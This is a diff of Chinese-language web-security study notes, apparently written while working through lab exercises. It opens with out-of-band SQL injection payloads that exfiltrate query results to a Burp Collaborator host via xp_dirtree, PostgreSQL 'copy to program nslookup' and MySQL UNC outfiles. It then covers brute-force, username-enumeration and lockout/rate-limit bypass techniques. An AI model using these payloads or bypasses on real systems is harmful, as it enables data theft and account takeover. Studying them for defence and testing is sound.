@@ -582,3 +582,136 @@ prestmt.executeQuery();
 | Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')` |
 | PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
 | MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
+
+# Authentication vulnerabilities 认证漏洞
+
+![image-20220115183814400](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115183814400.png)
+
+认证是验证一个特定用户或客户身份的过程。
+
+认证因素可以归结为：
+
+1. 用户知道的内容：密码或安全问题的答案
+2. 用户拥有的内容：手机或安全令牌之类的实物
+3. 用户的行为方式：生物行为模式
+
+认证机制依靠一系列技术验证因素中的一个或多个。
+
+### 认证和授权的区别
+
+认证是验证一个用户是不是所声明身份的过程，授权验证是验证一个用户是不是具有执行某项行为的权利。
+
+### 认证漏洞的产生原因
+
+1. 认证机制并不完善，不能完全阻止暴力破解的发生。
+2. 失效的身份验证，认证实现中逻辑缺陷或错误编码验证会导致攻击者使用技巧绕过登陆。
+
+### 认证漏洞的影响
+
+攻击者绕过认证或暴力破解后，可以访问被攻击账户的所有数据和功能。如果用户权限很高，就可以获取对网站的控制权，同时可以访问内部设施。低权限的用户可能造成信息泄露或提供了利用其他漏洞的可能。
+
+## 详解
+
+### 密码登陆中的漏洞
+
+#### 暴力破解
+
+暴力破解指的是攻击者通过不断登陆，利用系统提供的错误显示信息，猜解用户的正确信息。
+
+暴力破解可以分为完全猜解和不完全猜解。当攻击者对猜解信息毫无头绪时，通常使用巨大的密码字典进行暴力破解。通常情况下，攻击者可以利用一些基本的密码逻辑和收集到的用户信息，做出有一定依据的猜解。
+
+##### 暴力破解用户名
+
+用户名容易被猜解是因为可视化较高，甚至可以猜测到。
+
+可以检查是否能在不登录情况下访问用户档案，或HTTP响应中是否有被泄露。
+
+##### 暴力破解密码
+
+密码破解的难度随密码的复杂程度有所不同，通常的网站会采取一定形式规范用户密码的设置（比如，规定最少密码位数、大小写和特殊字符）。
+
+我们可以根据猜解用户行为方式使得暴力破解过程更便捷，比如通常不会使用随机字符组合方式创建密码。
+
+### 用户名枚举
+
+攻击者通过观察网站响应内容猜解用户名，通常发生在登录页面上。
+
+在暴力破解时，应该注意以下的网站响应差异：
+
+1. ==状态码==
+   在暴力破解的猜解过程中，返回的HTTP状态码中，如果猜解返回的状态码是不同的，表明用户名可能是正确的。
+   ==最佳解决方案是：网站始终返回相同的状态代码==
+   ![image-20220115195522534](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115195522534.png)
+2. 错误信息
+   取决于用户名和密码的正确与否，返回的错误信息可能不同。
+3. 响应时间
+   当大多数请求都有相似的响应时间，有些请求响应与之不同，可能在后端发生了一些问题，是猜解正确的一种迹象。
+   - ==注意事项==：当利用响应时间作为判断依据时
+     ![image-20220115213935297](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220115213935297.png)
+     在Burp中需要打开Response received和Response completed作为值比较。同时，username或password猜解的另一方需为较大的==字符值==（至少大于100)，才能分辨出存在的用户名。
+
+### 有缺陷的防护措施
+
+暴力破解必定涉及很多错误的猜解，防止暴力破解最常见的两种常见方法是：
+
+1. 如果失败次数过多，锁定远程访问用户的权限
+2. 如果IP地址进行过多的远程登陆尝试，阻止IP地址的访问
+   待解决问题：
+   ![image-20220116003327432](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116003327432.png)
+   在Burpsuite的Intruder模块爆破时，理论上通过一个正确混搭一个猜解的方式可以绕过同IP多次暴力破解导致被封时间。但通过测试，在随机一定范围内会正常进行，之后就会被判断为同IP多次登陆失败。
+   ==已解决==：
+   通过利用Resource Pool并发数配置，在两个请求间人为的设置一个间隔时间，使得服务器响应彻底返回即可。
+
+### 账户锁定相关
+
+当满足某些可疑条件（如一定数量的登录失败）时锁定账户。服务器指示账户已锁定时，用户名可以被枚举猜解出来。
+
+#### 绕过账户锁定保护的技巧
+
+1. 构建一个足够小的密码字典，以达成不超过限制登陆次数
+2. 使用凭证登陆。由一个网站数据泄露的凭证，攻击者使用一个凭证可能登陆很多使用同样凭证方式的网站。
+
+### 用户限流
+
+在短时间内尝试登陆请求次数过多，网站可能将IP地址限制登陆。
+
+通常可以通过以下方式解封：
+
+1. 管理员手动操作
+2. 用户完成验证后解封
+
+用户限流通常比锁定账户更有效，通常情况下避免了用户名猜解和DDOS攻击。
+
+#### 例子
+
+请求如下
+
+![image-20220116021813790](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021813790.png)
+
+在Repeater构造如下请求即可
+
+![image-20220116021724828](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021724828.png)
+
+返回302登录成功
+
+![image-20220116021901587](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021901587.png)
+
+右键点击Show response in Browser
+
+![image-20220116021944246](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220116021944246.png)
+
+成功利用漏洞
+
+## HTTP基本认证
+
+在HTTP认证中，客户端从服务器收到一个token。token由用户名和密码连接而成，并用Base64编码进行加密。这个token由浏览器存储和管理，浏览器会自动加入后续请求的认证内。如
+
+```
+Authorization: Basic base64(username:password)
+```
+
+但这并不安全，每次请求中不断重复发送用户的token，除非网站实现了HSTS，否则可以被中间人攻击截获。
+
+其次，用户的token是完全静态的，很容易被暴力破解。
+
+同时，被CSRF跨站请求伪造攻击。
